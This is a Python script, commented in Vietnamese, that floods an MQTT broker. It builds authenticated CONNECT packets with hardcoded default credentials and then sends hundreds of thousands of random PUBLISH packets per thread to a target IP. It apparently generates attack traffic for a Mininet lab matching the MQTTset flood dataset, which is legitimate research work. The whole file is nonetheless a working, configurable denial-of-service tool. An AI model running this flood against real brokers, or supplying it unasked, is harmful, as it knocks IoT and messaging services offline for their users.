#!/usr/bin/env python3
"""
Attack 1 — MQTT Flood (DoS / Flood)
=====================================
Gửi hàng nghìn PUBLISH message liên tục đến broker bằng raw socket.
Tự build MQTT CONNECT packet có username/password để vượt qua authentication.

Chạy:
    python3 attack1_mqtt_flood.py --host 10.0.0.10 --port 1883 --threads 3 --iter 5
    python3 attack1_mqtt_flood.py --host 10.0.0.10 --port 1883 --threads 10 --iter 5000 --user mqttadmin --password Xk9mP2vL
"""

import socket
import time
import argparse
import threading
import logging
import random
import string
import sys

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(threadName)s] %(message)s")
log = logging.getLogger("FloodAttack")

# ── Thống kê toàn cục ─────────────────────────────────────────────────────────
stats_lock       = threading.Lock()
total_sent_msgs  = 0
total_errors     = 0
total_blocked    = 0


def build_connect_packet(username: str, password: str, client_id: str = "flood") -> bytes:
    """
    Tự build MQTT CONNECT packet (v3.1.1) có username + password.
    Broker bật allow_anonymous=false sẽ trả CONNACK rc=0 thay vì rc=5.
    """
    # Encode các trường
    def encode_str(s: str) -> bytes:
        b = s.encode("utf-8")
        return len(b).to_bytes(2, "big") + b

    protocol_name   = encode_str("MQTT")
    protocol_level  = b'\x04'          # v3.1.1

    # Connect flags: username(1) + password(1) + clean_session(1) = 0b11000010 = 0xC2
    connect_flags   = b'\xC2'
    keepalive       = (60).to_bytes(2, "big")

    payload = encode_str(client_id) + encode_str(username) + encode_str(password)

    variable_header = protocol_name + protocol_level + connect_flags + keepalive
    remaining       = variable_header + payload

    # Fixed header
    fixed_header    = b'\x10' + len(remaining).to_bytes(1, "big")
    return fixed_header + remaining


def generate_random_chunk() -> bytes:
    """
    Tạo khối TCP ~32KB chứa 1820 gói MQTT PUBLISH rác ngẫu nhiên.
    Khớp với tcp.len trong dataset MQTTset flood.csv.
    """
    garbage      = ''.join(random.choices(string.ascii_letters + string.digits, k=14)).encode()
    # \x30\x10 = PUBLISH QoS0, RemLen=16 | \x00\x0b = TopicLen=11
    single_pub   = b'\x30\x10\x00\x0b' + garbage
    return single_pub * 1820


def raw_flood_worker(target_ip: str, target_port: int, rate: int,
                     iterations: int, thread_id: int,
                     username: str, password: str):
    """
    Mỗi iteration: mở TCP socket → CONNECT (có auth) → bắn 500 chunk 32KB → đóng.
    """
    global total_sent_msgs, total_errors, total_blocked

    delay      = 1.0 / rate if rate > 0 else 0
    client_id  = f"flood-{thread_id}-{random.randint(1000, 9999)}"
    connect_pkt = build_connect_packet(username, password, client_id)

    for _ in range(iterations):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            s.send(connect_pkt)
            time.sleep(0.01)   # Chờ CONNACK

            # Đọc CONNACK để xác nhận kết nối được chấp nhận
            try:
                connack = s.recv(4)
                # CONNACK: \x20\x02\x00\x00 = rc=0 (accepted)
                if len(connack) >= 4 and connack[3] != 0:
                    log.warning(f"[T{thread_id}] CONNACK rc={connack[3]} — broker từ chối (sai credentials?)")
                    s.close()
                    with stats_lock:
                        total_blocked += 1
                    time.sleep(0.1)
                    continue
            except socket.timeout:
                pass  # Bỏ qua nếu không nhận được CONNACK

            # Bắn 500 chunk 32KB (~910,000 tin nhắn mỗi iteration)
            local_sent = 0
            for _ in range(500):
                try:
                    chunk = generate_random_chunk()
                    s.sendall(chunk)
                    local_sent += 1820
                    if delay > 0:
                        time.sleep(delay)
                except Exception:
                    break

            s.close()

            with stats_lock:
                total_sent_msgs += local_sent

        except ConnectionRefusedError:
            with stats_lock:
                total_blocked += 1
            time.sleep(0.1)
        except Exception:
            with stats_lock:
                total_errors += 1
            time.sleep(0.1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MQTT Raw Flood Attack (với authentication)")
    parser.add_argument("--host",     required=True,         help="IP Broker")
    parser.add_argument("--port",     type=int, default=1883)
    parser.add_argument("--threads",  type=int, default=3,   help="Số luồng tấn công")
    parser.add_argument("--rate",     type=int, default=0,   help="Tốc độ (0 = tối đa)")
    parser.add_argument("--iter",     type=int, default=5,   help="Số vòng lặp mỗi thread (mỗi vòng bắn ~910k msgs)")
    parser.add_argument("--user",     default="mqttadmin",   help="MQTT username")
    parser.add_argument("--password", default="Xk9mP2vL",    help="MQTT password")
    args = parser.parse_args()

    print("\n" + "=" * 60)
    print("  🔥 ATTACK 1 — HIGH-POWER RAW MQTT FLOOD")
    print(f"  🎯 Target IP  : {args.host}:{args.port}")
    print(f"  🧵 Threads    : {args.threads}")
    print(f"  🔄 Iterations : {args.iter} (Mỗi iter bắn ~910k msgs)")
    print(f"  🔑 Auth       : {args.user} / {args.password}")
    print("=" * 60)

    start_time  = time.time()
    thread_list = []

    for i in range(args.threads):
        t = threading.Thread(
            target=raw_flood_worker,
            args=(args.host, args.port, args.rate, args.iter, i,
                  args.user, args.password),
            name=f"Flood-{i}",
            daemon=True,
        )
        thread_list.append(t)
        t.start()

    for t in thread_list:
        t.join()

    duration = time.time() - start_time

    print("\n" + "=" * 60)
    print("  📊 KẾT QUẢ TẤN CÔNG")
    print(f"  ⏱️  Thời gian      : {duration:.2f}s")
    print(f"  📤 Tổng tin nhắn  : {total_sent_msgs:,}")
    print(f"  ❌ Lỗi            : {total_errors:,}")
    print(f"  🚫 Bị chặn        : {total_blocked:,}")
    if duration > 0 and total_sent_msgs > 0:
        print(f"  ⚡ Tốc độ TB      : {total_sent_msgs / duration:,.1f} msg/s")
    print("=" * 60)
    print("[*] Tự động quay lại Terminal Mininet...")
    sys.exit(0)
